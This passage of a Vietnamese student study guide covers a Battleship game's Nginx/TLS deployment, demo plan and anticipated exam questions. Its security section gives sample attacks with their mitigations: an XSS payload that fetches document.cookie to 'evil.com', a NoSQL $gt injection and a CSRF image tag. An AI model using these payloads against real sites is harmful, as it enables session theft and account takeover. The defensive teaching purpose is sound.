         │   - Chat history        │
         │   - Game records        │
         └─────────────────────────┘
```

### 🔧 Nginx Reverse Proxy (Chi Tiết)

**Vai trò của Nginx:**
1. **SSL/TLS Termination** - Giải mã HTTPS, chuyển HTTP xuống Node.js
2. **Load Balancer** - Phân tải nếu có nhiều Node.js instances
3. **Static File Serving** - Serve HTML/CSS/JS/Images (nhanh hơn Node.js)
4. **Security Layer** - Rate limiting, DDoS protection
5. **WebSocket Proxy** - Forward Socket.IO connections

**Cấu hình quan trọng:**

```nginx
# File: /etc/nginx/sites-available/battleship

# HTTPS Server Block
server {
  listen 443 ssl;
  server_name battleshipgame.fun www.battleshipgame.fun;
  
  # SSL Certificates (Let's Encrypt)
  ssl_certificate /etc/letsencrypt/live/battleshipgame.fun/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/battleshipgame.fun/privkey.pem;
  
  # HTTP Traffic → Node.js
  location / {
    proxy_pass http://127.0.0.1:3000;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
  
  # WebSocket Traffic → Node.js (Socket.IO)
  location /socket.io/ {
    proxy_pass http://127.0.0.1:3000;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;      # Critical!
    proxy_set_header Connection "upgrade";       # Critical!
    proxy_set_header Host $host;
  }
}

# HTTP Server Block → Redirect to HTTPS
server {
  listen 80;
  server_name battleshipgame.fun www.battleshipgame.fun;
  return 301 https://$host$request_uri;
}
```

**Tại sao cần headers này?**

| Header | Mục đích |
|--------|----------|
| `Host` | Node.js biết domain gốc (nếu có nhiều domains) |
| `X-Real-IP` | Node.js thấy IP thực của client (không phải 127.0.0.1) |
| `X-Forwarded-For` | Track full proxy chain |
| `X-Forwarded-Proto` | Node.js biết request gốc là HTTPS |
| `Upgrade` | Yêu cầu upgrade HTTP → WebSocket |
| `Connection: "upgrade"` | Giữ kết nối persistent cho WebSocket |

**WebSocket Location Block:**
- **Bắt buộc** có `proxy_http_version 1.1`
- **Bắt buộc** có `Upgrade` và `Connection` headers
- Nếu thiếu → Socket.IO sẽ fallback về long-polling (chậm)

### 🔐 SSL/TLS với Let's Encrypt

**Quy trình tự động:**
```
1. Install Certbot
   sudo apt install certbot python3-certbot-nginx

2. Generate Certificate
   sudo certbot --nginx -d battleshipgame.fun -d www.battleshipgame.fun
   
3. Certbot tự động:
   - Verify domain ownership (HTTP-01 challenge)
   - Generate certificate (90 days validity)
   - Update Nginx config
   - Add SSL directives
   
4. Auto-renewal (cron job)
   sudo certbot renew --dry-run
   
5. Certificate renews at 60 days (before 90 days expiry)
```

**Files được tạo:**
```
/etc/letsencrypt/live/battleshipgame.fun/
├── fullchain.pem    ← Certificate + Intermediate CA (Nginx uses this)
├── privkey.pem      ← Private key (KEEP SECRET!)
├── chain.pem        ← Intermediate CA only
└── cert.pem         ← Your certificate only
```

**TLS Handshake Flow:**
```
1. [Browser] → ClientHello (TLS 1.2/1.3, ciphers list)

2. [Browser] ← ServerHello + Certificate ← [Nginx]
              (Chosen cipher, server's public key from fullchain.pem)

3. [Browser] → Verify certificate chain:
              - Check CA signature (Let's Encrypt → IdenTrust Root)
              - Check domain name matches
              - Check expiry date
              
4. [Browser] → Generate session key
              → Encrypt with server's public key
              → Send to server

5. [Nginx] → Decrypt session key with privkey.pem

6. ✅ Symmetric encryption established
   [Browser] ←═══ AES-256 encrypted data ═══→ [Nginx]
```

**SSL Configuration Best Practices:**
```nginx
# Modern TLS only
ssl_protocols TLSv1.2 TLSv1.3;

# Session resumption (performance)
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 24h;

# Security headers
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
```

### 📊 So Sánh: Direct Node.js vs Nginx Reverse Proxy

| Khía Cạnh | Direct Node.js :443 | Nginx Reverse Proxy |
|-----------|---------------------|---------------------|
| **SSL Handling** | Node.js tự handle (cert/key trong code) | Nginx handle (transparent cho Node.js) ✅ |
| **Performance** | Slow (Node.js xử lý SSL + logic) | Fast (Nginx chuyên xử lý SSL) ✅ |
| **Static Files** | Node.js serve (I/O blocking) | Nginx serve (optimized) ✅ |
| **Multiple Apps** | 1 port = 1 app | 1 port, nhiều apps (subdomain/path) ✅ |
| **Load Balancing** | Cần cluster module | Built-in upstream directive ✅ |
| **DDoS Protection** | Phải tự code | Rate limiting, connection limits ✅ |
| **Zero Downtime** | Restart = downtime | Reload config không downtime ✅ |
| **Port 80/443** | Cần root privileges | Nginx chạy root, Node.js chạy user ✅ |
| **Monitoring** | Phải tự setup | Access logs, error logs sẵn ✅ |
| **Caching** | Không có | Built-in proxy_cache ✅ |

**Kết luận:** Nginx reverse proxy là **best practice** cho production!

### 🔍 Debug & Monitoring

**Kiểm tra Nginx:**
```bash
# Test config syntax
sudo nginx -t

# Reload config (no downtime)
sudo systemctl reload nginx

# View active config
sudo nginx -T

# View error log
sudo tail -f /var/log/nginx/error.log

# View access log
sudo tail -f /var/log/nginx/access.log
```

**Kiểm tra SSL:**
```bash
# Check certificate expiry
echo | openssl s_client -connect battleshipgame.fun:443 2>/dev/null | openssl x509 -noout -dates

# Test SSL/TLS (SSL Labs grade)
# Visit: https://www.ssllabs.com/ssltest/analyze.html?d=battleshipgame.fun

# Check which ciphers are supported
nmap --script ssl-enum-ciphers -p 443 battleshipgame.fun
```

**Kiểm tra Node.js:**
```bash
# PM2 status
pm2 status

# PM2 logs
pm2 logs

# Check if Node.js listening on 3000
netstat -tuln | grep 3000
# or
lsof -i :3000
```

**Kiểm tra WebSocket:**
```bash
# Install wscat
npm install -g wscat

# Test WebSocket connection
wscat -c wss://battleshipgame.fun/socket.io/?EIO=4&transport=websocket
```

### 🚨 Common Issues & Solutions

**1. 502 Bad Gateway**
```
Nginx error: connect() failed (111: Connection refused)

Cause: Node.js not running on port 3000
Fix:
  pm2 start server.js
  pm2 save
```

**2. WebSocket Connection Failed**
```
Browser error: WebSocket connection to 'wss://...' failed

Cause: Missing Upgrade header in Nginx
Fix: Ensure location /socket.io/ has:
  proxy_set_header Upgrade $http_upgrade;
  proxy_set_header Connection "upgrade";
```

**3. Mixed Content Warning**
```
Browser warning: Mixed Content (HTTP in HTTPS page)

Cause: Node.js returning HTTP URLs in HTTPS page
Fix: Check X-Forwarded-Proto header in Node.js
  const protocol = req.headers['x-forwarded-proto'] || 'http';
```

**4. Certificate Expired**
```
SSL_ERROR_EXPIRED_CERT

Cause: Let's Encrypt cert not renewed (90 days)
Fix:
  sudo certbot renew --force-renewal
  sudo systemctl reload nginx
```

**5. Rate Limit Hitting**
```
429 Too Many Requests

Cause: Client exceeds rate limit (50 requests/15min)
Fix: Wait or whitelist IP in rate limiter
```

### 📈 Performance Optimization

**Nginx Caching:**
```nginx
# Cache static files
location ~* \.(jpg|jpeg|png|gif|ico|css|js|woff2)$ {
  expires 1y;
  add_header Cache-Control "public, immutable";
}

# Proxy cache (for API responses)
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=api_cache:10m;
location /api/ {
  proxy_cache api_cache;
  proxy_cache_valid 200 5m;
  proxy_pass http://127.0.0.1:3000;
}
```

**Gzip Compression:**
```nginx
gzip on;
gzip_types text/plain text/css application/json application/javascript text/xml;
gzip_min_length 1000;
```

**Connection Limits:**
```nginx
# Limit connections per IP
limit_conn_zone $binary_remote_addr zone=addr:10m;
limit_conn addr 10;

# Limit request rate
limit_req_zone $binary_remote_addr zone=req:10m rate=10r/s;
limit_req zone=req burst=20 nodelay;
```

### 🎓 Câu Hỏi Thi Về Infrastructure

**Q1: "Tại sao dùng Nginx reverse proxy thay vì Node.js trực tiếp?"**
→ SSL termination, static file serving, load balancing, DDoS protection
→ Nginx chuyên xử lý network, Node.js chuyên business logic

**Q2: "SSL/TLS handshake diễn ra ở đâu?"**
→ Ở Nginx (port 443), trước khi tới Node.js
→ Node.js nhận plaintext HTTP, không biết gì về SSL

**Q3: "Nếu Nginx crash thì sao?"**
→ Toàn bộ website down (502 Bad Gateway)
→ Giải pháp: Multiple Nginx instances + Load Balancer (HAProxy)

**Q4: "WebSocket upgrade diễn ra như thế nào qua Nginx?"**
→ Client: Upgrade: websocket, Connection: Upgrade
→ Nginx: Forward headers tới Node.js
→ Node.js: 101 Switching Protocols
→ Connection giữ persistent, bidirectional

**Q5: "Let's Encrypt cert expire sau bao lâu?"**
→ 90 days
→ Certbot cron job auto-renew at 60 days
→ Check: `sudo certbot certificates`

---

## 🎯 DEMO SCENARIO (Toàn Team)

### Kịch Bản Demo (15-20 phút)

**Chuẩn bị:**
- 2 browsers (Chrome Incognito + Firefox)
- Console logs mở sẵn
- Wireshark (optional - để show TCP/UDP packets)

**Flow:**
1. **Member 1 demo:** Login → JWT token → LocalStorage
2. **Member 2 demo:** Hub → Quick Play matchmaking → Lobby
3. **Member 3 demo:** Deploy ships → Attack → Turn system
4. **Member 4 demo:** Chat messages → MongoDB storage
5. **Member 5 demo:** Voice call → P2P connection

**Console Logs Để Ý:**
```
[SocketShared] Connected. Socket ID: abc123
[SocketShared] Authenticated: { userId, username }
[Hub] Joining matchmaking queue...
[Hub] Match found! RoomID: room_1234, Opponent: Player2
[Game] Attack sent: { row: 5, col: 3 }
[Game] Attack result: HIT! Ship sunk: destroyer
[WebRTC] ICE candidate sent: srflx (public IP discovered)
[WebRTC] P2P connection established
```

---

## 📊 SLIDE STRUCTURE (Khuyến Nghị)

### Slide 1: Title
- Tên dự án: Battleship Multiplayer Game
- Nhóm 3 - 5 thành viên
- GitHub + Domain

### Slide 2: Tech Stack Overview
```
Frontend: HTML/CSS/JavaScript
Backend: Node.js + Express + Socket.IO
Database: MongoDB + Redis
Real-time: Socket.IO (TCP WebSocket)
P2P: WebRTC (UDP)
Deploy: AWS EC2 + PM2 + Nginx
```

### Slide 3-7: Member 1-5 Presentations
- Mỗi member 3-4 slides
- Code snippets + diagrams

### Slide 8: Architecture Diagram
```
┌─────────┐                    ┌─────────┐
│Client A │                    │Client B │
│(Browser)│                    │(Browser)│
└────┬────┘                    └────┬────┘
     │ HTTP API (TCP)               │
     │ WebSocket (TCP)              │
     ├──────────┬──────────────────┤
                │
         ┌──────▼──────┐
         │   Server    │
         │  Node.js    │
         │  Socket.IO  │
         └──────┬──────┘
                │
      ┌─────────┼─────────┐
      │                   │
┌─────▼─────┐       ┌────▼────┐
│  MongoDB  │       │  Redis  │
│  (Cloud)  │       │ (Local) │
└───────────┘       └─────────┘

     WebRTC Media (UDP - P2P)
Client A ═══════════════════ Client B
```

### Slide 8.5: Production Infrastructure (MỚI - Quan Trọng!)
```
                  ┌──────────────┐
                  │   INTERNET   │
                  └──────┬───────┘
                         │
                    HTTPS (443)
                    HTTP (80) → 301 redirect
                         │
                         ↓
         ┌───────────────────────────────┐
         │     AWS EC2 (Ubuntu)          │
         │  battleshipgame.fun           │
         │                               │
         │  ┌─────────────────────────┐  │
         │  │   Nginx :443 (SSL)      │  │
         │  │   - Let's Encrypt       │  │
         │  │   - Reverse Proxy       │  │
         │  │   - WebSocket Proxy     │  │
         │  └──────────┬──────────────┘  │
         │             │ HTTP             │
         │             ↓                  │
         │  ┌─────────────────────────┐  │
         │  │   Node.js :3000         │  │
         │  │   (PM2 managed)         │  │
         │  │   - Express             │  │
         │  │   - Socket.IO           │  │
         │  └──────────┬──────────────┘  │
         │             │                  │
         │             ↓                  │
         │  ┌─────────────────────────┐  │
         │  │   Redis (Local)         │  │
         │  │   - Game state cache    │  │
         │  │   - TTL 2 hours         │  │
         │  └─────────────────────────┘  │
         └───────────────┬────────────────┘
                         │
                    Internet
                         │
                         ↓
         ┌───────────────────────────────┐
         │   MongoDB Atlas (Cloud)       │
         │   - Users (persistent)        │
         │   - Chat history (TTL 7d)     │
         │   - Game records              │
         │   - Call logs (TTL 30d)       │
         └───────────────────────────────┘

Legend:
━━━ HTTPS/TLS encrypted
─── HTTP plaintext
═══ WebRTC P2P (UDP)
```

**Key Points cho Slide:**
- ✅ Nginx = SSL termination + reverse proxy
- ✅ Let's Encrypt = Free SSL auto-renewal (90 days)
- ✅ PM2 = Process manager (auto-restart Node.js)
- ✅ Redis = In-memory cache (fast, TTL)
- ✅ MongoDB Atlas = Cloud database (persistent)

### Slide 9: Key Features
- ✅ Real-time multiplayer (Socket.IO)
- ✅ Voice call (WebRTC)
- ✅ Guest login (24h TTL)
- ✅ Private rooms (6-char code)
- ✅ Reconnect handling
- ✅ Server-authoritative (anti-cheat)

### Slide 10: Network Concepts
- TCP vs UDP comparison table
- Socket.IO events (40+ events)
- WebRTC signaling flow

### Slide 11: Challenges & Limitations
- Single process (need cluster)
- No TURN server (70% call success)
- In-memory state (lost on restart)
- No cheat prevention

### Slide 12: Demo
- Live demo hoặc video recording

### Slide 13: Q&A
- Câu hỏi thường gặp sẵn

---

## 🔧 CHECKLIST TRƯỚC KHI TRÌNH BÀY

### Kiến Thức
- [ ] Mỗi member hiểu rõ phần của mình
- [ ] Đọc qua phần của member khác (để trả lời câu hỏi cross-topic)
- [ ] Hiểu flow end-to-end (login → game → call)
- [ ] **ĐỌC KỸ NETWORK_STUDY_NOTES.md** - Có toàn bộ kiến thức thi!

### Kiến Thức Bổ Sung (Quan Trọng!)
- [ ] Hiểu Nginx reverse proxy architecture
- [ ] Hiểu SSL/TLS handshake (5 bước)
- [ ] Hiểu Let's Encrypt auto-renewal
- [ ] Hiểu WebSocket upgrade qua Nginx
- [ ] Biết debug: `nginx -t`, `pm2 logs`, `certbot certificates`
- [ ] Biết 10 câu hỏi thường gặp trong NETWORK_STUDY_NOTES.md

### Kỹ Thuật
- [ ] Code chạy được trên localhost
- [ ] Demo scenario test thành công
- [ ] Screenshots/video backup (phòng demo fail)
- [ ] Console logs clean (không có errors)

### Trình Bày
- [ ] Slides < 15 slides (10-12 slides ideal)
- [ ] Font size đủ lớn (>= 24pt)
- [ ] Code snippets syntax highlighting
- [ ] Diagrams rõ ràng (draw.io hoặc Mermaid)

### Câu Hỏi Dự Đoán
1. **"Tại sao dùng Socket.IO thay vì pure WebSocket?"**
   → Auto reconnect, rooms, fallback to polling, event abstraction

2. **"TCP vs UDP khác nhau gì? Khi nào dùng cái nào?"**
   → TCP: reliable, ordered, high latency → Game logic
   → UDP: low latency, unreliable → Voice call

3. **"STUN vs TURN là gì?"**
   → STUN: Discover public IP (lightweight)
   → TURN: Relay server khi P2P fail (expensive)

4. **"Server authoritative là gì? Tại sao cần?"**
   → Server validate mọi move để chống cheat
   → Client chỉ hiển thị, không quyết định kết quả

5. **"Nếu JWT_SECRET bị lộ thì sao?"**
   → Hacker tạo fake token → truy cập bất kỳ account nào
   → Phải đổi secret ngay → All users phải login lại

6. **"Redis dùng để làm gì?"**
   → Cache game state (in-memory, fast)
   → TTL 2 hours (auto-delete old games)
   → Connection tracking (user online status)

7. **"MongoDB TTL index hoạt động như nào?"**
   → Background process check mỗi 60s
   → Delete documents khi `createdAt + ttl < now`
   → Guest users: 24h, Chat: 7 days, Calls: 30 days

8. **"Multicast trong project là gì?"**
   → Socket.IO room broadcasting (application-level)
   → `io.to(roomId).emit()` → All sockets in room
   → Không phải IP multicast (224.x.x.x)

9. **"Project có đa luồng (multithreading) không?"**
   → Không. Node.js single-threaded (Event Loop)
   → Async I/O non-blocking → Concurrent, not parallel
   → Có thể scale bằng cluster module (đa tuyến)

10. **"Hạn chế lớn nhất của project?"**
    → In-memory state (restart = mất game)
    → No TURN (call fail rate 20-30%)
    → Single process (no high availability)
    → No cheat prevention (client có thể spam events)

### Câu Hỏi Về Infrastructure (MỚI - Quan Trọng!)

11. **"Tại sao dùng Nginx reverse proxy?"**
    → SSL termination (Nginx handle TLS, Node.js nhận HTTP plaintext)
    → Static file serving (nhanh hơn Node.js)
    → Load balancing, rate limiting, DDoS protection
    → WebSocket proxy với Upgrade header

12. **"SSL/TLS handshake diễn ra ở đâu trong hệ thống?"**
    → Ở Nginx (port 443), không phải Node.js
    → Browser ←TLS→ Nginx ←HTTP→ Node.js
    → Node.js không biết gì về SSL

13. **"Let's Encrypt certificate expire sau bao lâu?"**
    → 90 days (3 tháng)
    → Certbot auto-renew at 60 days (cron job)
    → Check: `sudo certbot certificates`

14. **"WebSocket upgrade qua Nginx như thế nào?"**
    → Client gửi: `Upgrade: websocket`, `Connection: upgrade`
    → Nginx forward headers tới Node.js (cần `proxy_http_version 1.1`)
    → Node.js response: `101 Switching Protocols`
    → Connection persistent, bidirectional

15. **"Nếu Nginx crash thì sao?"**
    → Toàn bộ website down (không ai access được)
    → Node.js vẫn chạy nhưng không có entry point
    → Giải pháp: Multiple Nginx + Load Balancer (HAProxy)

16. **"502 Bad Gateway error nghĩa là gì?"**
    → Nginx không connect được tới Node.js backend
    → Nguyên nhân: Node.js không chạy hoặc port sai
    → Fix: `pm2 start server.js` hoặc check port 3000

17. **"X-Forwarded-For header dùng để làm gì?"**
    → Node.js biết IP thực của client (không phải 127.0.0.1 của Nginx)
    → Important cho: Rate limiting by IP, logging, analytics
    → Format: `X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip`

18. **"Tại sao cần proxy_set_header Upgrade trong Nginx?"**
    → WebSocket cần upgrade từ HTTP → WS protocol
    → Nginx phải forward header này tới Node.js
    → Nếu thiếu → Socket.IO fallback về long-polling (chậm)

19. **"Gzip compression trong Nginx có lợi gì?"**
    → Giảm bandwidth (~70% cho text/html/css/js)
    → Faster page load (ít data transfer)
    → Tốn CPU để compress (trade-off)

20. **"Production có khác Development không?"**
    → Dev: HTTP localhost:3000, no Nginx, self-signed SSL
    → Prod: HTTPS domain, Nginx reverse proxy, Let's Encrypt
    → Prod: PM2 (auto-restart), Redis persistence, monitoring

### Câu Hỏi Về TCP/UDP (Network Fundamentals)

21. **"TCP 3-way handshake là gì?"**
    ```
    [Client] → SYN (seq=x) → [Server]
    [Client] ← SYN-ACK (seq=y, ack=x+1) ← [Server]
    [Client] → ACK (ack=y+1) → [Server]
    ✅ Connection established
    ```
    → Đảm bảo cả 2 bên sẵn sàng trước khi transfer data

22. **"TCP 4-way termination là gì?"**
    ```
    [Client] → FIN → [Server]
    [Client] ← ACK ← [Server]
    [Client] ← FIN ← [Server]
    [Client] → ACK → [Server]
    ✅ Connection closed gracefully
    ```

23. **"UDP có checksum không?"**
    → Có! UDP header có checksum field (16 bits)
    → Nhưng chỉ detect errors, không retransmit như TCP
    → Nếu checksum fail → drop packet

24. **"Tại sao WebRTC dùng UDP cho media?"**
    → Real-time: Độ trễ thấp quan trọng hơn độ tin cậy
    → Packet loss: Người nghe có thể chịu được vài frame bị mất
    → TCP retransmit: Làm audio/video lag (packet đến muộn = vô dụng)

25. **"Socket.IO fallback to long-polling là gì?"**
    → Khi WebSocket không khả dụng (firewall block)
    → Client gửi HTTP request, server giữ connection cho đến khi có data
    → Sau khi response, client ngay lập tức gửi request mới
    → Chậm hơn WebSocket nhưng vẫn "real-time"

### Câu Hỏi Về WebSocket Protocol

26. **"WebSocket khác HTTP như thế nào?"**
    | HTTP | WebSocket |
    |------|-----------|
    | Request/Response | Bidirectional |
    | Stateless | Stateful (persistent) |
    | New connection mỗi request | 1 connection cho nhiều messages |
    | Text-based protocol | Binary/Text frames |
    | Header overhead lớn (>200 bytes) | Frame overhead nhỏ (2-14 bytes) |

27. **"WebSocket frame structure?"**
    ```
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5
    +-+-+-+-+-------+-+-------------+
    |F|R|R|R| opcode|M| Payload len |
    |I|S|S|S|  (4)  |A|    (7)      |
    |N|V|V|V|       |S|             |
    +-+-+-+-+-------+-+-------------+
    |     Extended payload length    |
    +-------------------------------+
    |     Masking-key (if MASK=1)   |
    +-------------------------------+
    |          Payload Data          |
    +-------------------------------+
    ```
    → FIN: Final frame
    → Opcode: 0x1 (text), 0x2 (binary), 0x8 (close), 0x9 (ping)
    → MASK: Client → Server phải mask (bảo mật)

28. **"Tại sao Socket.IO không dùng pure WebSocket?"**
    → WebSocket chỉ là transport layer
    → Socket.IO thêm: rooms, namespaces, acknowledgments, reconnection
    → Socket.IO có fallback (long-polling, short-polling)
    → Easier API: `emit(event, data)` thay vì `send(JSON.stringify())`

### Câu Hỏi Về Security

29. **"XSS attack là gì? Ví dụ trong chat?"**
    ```javascript
    // Attacker gửi:
    message: "<script>fetch('evil.com?cookie='+document.cookie)</script>"
    
    // Nếu không sanitize, browser execute:
    → Steal cookies, JWT token
    
    // Mitigation:
    message = message.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    → Browser hiển thị text, không execute
    ```

30. **"SQL Injection (NoSQL context)?"**
    ```javascript
    // Attack:
    username: { $gt: "" }  // Match all users
    password: { $gt: "" }
    
    // Vulnerable code:
    User.findOne({ username: req.body.username })
    
    // Mitigation:
    // 1. express-validator: check username is string
    // 2. Mongoose schema: strict type checking
    ```

31. **"CSRF attack và tại sao JWT immune?"**
    → CSRF: Attacker lừa browser gửi request với cookies
    ```html
    <img src="https://bank.com/transfer?to=attacker&amount=1000">
    ```
    → JWT in localStorage: Attacker không access được (same-origin policy)
    → Nhưng vulnerable to XSS (nếu attacker chạy được JS)

32. **"Rate limiting bypass?"**
    ```javascript
    // Attacker dùng nhiều IP (botnet)
    // Mitigation: Rate limit by user ID + IP
    
    // Attacker dùng distributed requests
    // Mitigation: Captcha after N failed attempts
    
    // Attacker chờ time window expire
    // Mitigation: Exponential backoff (1min → 5min → 15min)
    ```

33. **"Man-in-the-Middle attack và TLS?"**
    → Without TLS: Attacker intercept plaintext password
    → With TLS: Traffic encrypted với session key
    → Attacker chỉ thấy gibberish
    → BUT: Still vulnerable nếu user accept invalid certificate

### Câu Hỏi Về JWT

34. **"JWT stateless nghĩa là gì?"**
    → Server không lưu token (không có session table)
    → Verify bằng signature (dùng secret key)
    → Advantage: Scale horizontal dễ (không cần shared session store)
    → Disadvantage: Không thể revoke token trước expiry

35. **"Refresh token vs Access token?"**
    | Access Token | Refresh Token |
    |--------------|---------------|
    | Short-lived (15min) | Long-lived (7 days) |
    | Gửi mọi request | Chỉ gửi khi renew |
    | Expire → user logout | Expire → login lại |
    | Lưu memory/localStorage | Lưu httpOnly cookie |
    
    → Project hiện tại KHÔNG có refresh token (improvement needed)

36. **"JWT secret bị brute-force?"**
    → Nếu secret yếu (< 256 bits): có thể crack
    → Attacker lấy token → thử nhiều secret → tìm ra secret đúng
    → Mitigation: Secret >= 32 characters random
    → Best practice: Use RS256 (asymmetric) thay vì HS256

### Câu Hỏi Về Database

37. **"MongoDB vs SQL fundamental difference?"**
    | MongoDB | SQL |
    |---------|-----|
    | Document (JSON-like) | Row (fixed columns) |
    | Schema flexible | Schema strict |
    | Embed related data | JOIN tables |
    | Horizontal scale (sharding) | Vertical scale |
    | Eventual consistency | ACID transactions |

38. **"Mongoose schema vs MongoDB collection?"**
    → MongoDB: Schemaless (bất kỳ field nào cũng OK)
    → Mongoose: Schema enforcement ở application level
    ```javascript
    // Schema:
    username: { type: String, required: true }
    
    // MongoDB vẫn accept:
    { username: 123 }  // Wrong type
    
    // Nhưng Mongoose reject trước khi save
    ```

39. **"TTL index hoạt động thế nào?"**
    ```javascript
    // Schema:
    createdAt: { type: Date, index: { expires: '7d' } }
    
    // MongoDB background thread (mỗi 60s):
    FOR EACH document WHERE createdAt + 7d < NOW():
      DELETE document
    
    // Note: Không real-time (có thể chậm 1-2 phút)
    ```

40. **"Redis persistence: RDB vs AOF?"**
    → **RDB (Snapshot):** Save full dataset định kỳ (every 5 min)
      - Fast recovery, smaller file
      - Lose data giữa 2 snapshots
    
    → **AOF (Append-Only File):** Log mọi write command
      - Better durability (fsync every second)
      - Larger file, slower recovery
    
    → Project dùng: RDB only (default)

### Câu Hỏi Về Game Logic

41. **"Tại sao server-authoritative anti-cheat?"**
    ```javascript
    // Client-side (BAD):
    if (myShot === 'hit') {
      enemyShip.health -= 1;  // Client decide
      socket.emit('i_won');
    }
    → Attacker modify code: Always 'hit'
    
    // Server-side (GOOD):
    if (board[row][col] === 'ship') {
      game.hits++;  // Server decide
      socket.emit('attack_result', { hit: true });
    }
    → Client chỉ hiển thị, không quyết định
    ```

42. **"Reconnect logic: Tại sao cần grace period?"**
    → Network blip: disconnect 1-2 giây rồi reconnect
    → Nếu xóa game ngay: Player không rejoin được
    → Grace period 2s: Cho phép reconnect trước khi notify opponent
    → Sau 2s: Emit `player:disconnected`, đối thủ thấy "Opponent left"

43. **"Turn timer: Server-driven vs Client-driven?"**
    → **Client-driven (BAD):** Client đếm ngược, emit khi hết giờ
      - Attacker dừng timer → chơi mãi
    
    → **Server-driven (GOOD):** Server đếm, auto-skip nếu timeout
      - `setInterval(() => timer--, 1000)`
      - `if (timer === 0) handleTurnTimeout()`
      - Broadcast `battle_timer_update` mỗi giây

44. **"Deployment timer 120s vs Battle timer 30s?"**
    → **Deployment (120s):** Thời gian đặt tàu
      - Timeout → auto-place random ships
      - Purpose: Tránh player AFK block game
    
    → **Battle (30s per turn):** Thời gian suy nghĩ
      - Timeout → auto-random attack hoặc forfeit
      - Purpose: Game không kéo dài quá lâu

### Câu Hỏi Về WebRTC Advanced

45. **"SDP (Session Description Protocol) chứa gì?"**
    ```
    v=0                          // Version
    o=- 123456 2 IN IP4 127.0.0.1  // Origin
    s=-                          // Session name
    t=0 0                        // Time
    m=audio 9 UDP/TLS/RTP/SAVPF 111  // Media: audio
    m=video 9 UDP/TLS/RTP/SAVPF 96   // Media: video
    a=rtpmap:111 opus/48000/2    // Codec: Opus
    a=rtpmap:96 VP8/90000        // Codec: VP8
    a=candidate:... (ICE candidates)
    ```
    → Describe capabilities: codecs, resolution, bitrate, network

46. **"ICE trickle vs non-trickle?"**
    → **Non-trickle (old):** Collect ALL candidates → send offer
      - Chậm (5-10 seconds)
    
    → **Trickle (modern):** Send offer ngay → send candidates dần
      - Nhanh hơn (1-2 seconds)
      - Project dùng: Trickle ICE

47. **"DTLS-SRTP là gì?"**
    → **DTLS:** TLS over UDP (encrypt signaling)
    → **SRTP:** Secure RTP (encrypt media)
    → WebRTC bắt buộc encryption (không có plaintext option)
    → Keys exchange qua DTLS handshake

48. **"Symmetric NAT vs Cone NAT?"**
    → **Cone NAT:** 1 internal IP:port → 1 public IP:port
      - STUN works ✅
    
    → **Symmetric NAT:** Different public port cho mỗi destination
      - STUN fails ❌
      - Need TURN relay

### Câu Hỏi Về Performance & Scalability

49. **"Node.js Event Loop phases?"**
    ```
    ┌───────────────────────────┐
    │       timers              │ (setTimeout, setInterval)
    ├───────────────────────────┤
    │   pending callbacks       │ (I/O callbacks)
    ├───────────────────────────┤
    │       idle, prepare       │ (internal)
    ├───────────────────────────┤
    │         poll              │ (retrieve I/O events)
    ├───────────────────────────┤
    │         check             │ (setImmediate)
    ├───────────────────────────┤
    │     close callbacks       │ (socket.on('close'))
    └───────────────────────────┘
    ```
    → Single-threaded nhưng non-blocking I/O

50. **"Tại sao Node.js không dùng multi-threading?"**
    → JavaScript single-threaded by design
    → Multi-threading = shared memory = race conditions
    → Node.js dùng: Event-driven, async I/O
    → Scale: Cluster module (multi-process) hoặc load balancer

51. **"Socket.IO adapter là gì?"**
    → Default: In-memory adapter (single server only)
    → Problem: Server A rooms ≠ Server B rooms
    → Solution: Redis adapter
    ```javascript
    const { createAdapter } = require('@socket.io/redis-adapter');
    io.adapter(createAdapter(redisClient));
    ```
    → All servers share room state via Redis pub/sub

52. **"Horizontal vs Vertical scaling?"**
    → **Vertical:** Thêm CPU/RAM cho 1 server
      - Limit: Hardware cap
      - Single point of failure
    
    → **Horizontal:** Thêm nhiều servers
      - Unlimited (add more machines)
      - Need load balancer + Redis adapter

53. **"PM2 cluster mode vs fork mode?"**
    → **Fork mode:** 1 process
      - Simple, single-threaded
    
    → **Cluster mode:** N processes (1 per CPU core)
      - `pm2 start server.js -i max`
      - Load balanced by PM2
      - Need Redis adapter cho Socket.IO

54. **"Memory leak trong Node.js?"**
    → **Cause:** Global variables không xóa, listeners không remove
    ```javascript
    // BAD:
    const cache = {};
    setInterval(() => {
      cache[Date.now()] = data;  // Grow forever
    }, 1000);
    
    // GOOD:
    const cache = new Map();
    setInterval(() => {
      if (cache.size > 1000) cache.clear();
    }, 60000);
    ```

### Câu Hỏi Về Monitoring & Debugging

55. **"Làm sao biết server overload?"**
    → **Metrics cần theo dõi:**
      - CPU usage (> 80% = danger)
      - Memory usage (> 90% = swap)
      - Event loop lag (> 50ms = slow)
      - Request latency (> 1s = issue)
      - Error rate (> 1% = investigate)
    
    → Tools: PM2 dashboard, New Relic, DataDog

56. **"Debug Socket.IO connection issues?"**
    ```javascript
    // Client:
    const socket = io({ 
      debug: true,  // Enable debug logs
      transports: ['websocket', 'polling']
    });
    
    // Server:
    DEBUG=socket.io* node server.js
    
    // Check:
    1. CORS policy (browser console)
    2. JWT token valid (Network tab)
    3. Nginx WebSocket config (Upgrade header)
    4. Firewall blocking port 443/80
    ```

57. **"Nginx access log vs error log?"**
    → **Access log:** Mọi request (200, 404, etc.)
    ```
    203.0.113.50 - [04/Jan/2026] "GET /api/profile" 200 1234
    ```
    
    → **Error log:** Chỉ errors (502, 500, etc.)
    ```
    [error] connect() failed (111: Connection refused)
    ```

58. **"Rate limit counter reset như thế nào?"**
    ```javascript
    // Sliding window:
    const requests = redis.get(`ratelimit:${ip}`);
    if (requests >= 50) return 429;
    
    redis.incr(`ratelimit:${ip}`);
    redis.expire(`ratelimit:${ip}`, 900);  // 15 minutes
    
    // After 15min: Counter auto-reset to 0
    ```

59. **"Trace request từ Browser → Database?"**
    ```
    1. Browser → HTTPS request → Nginx access log
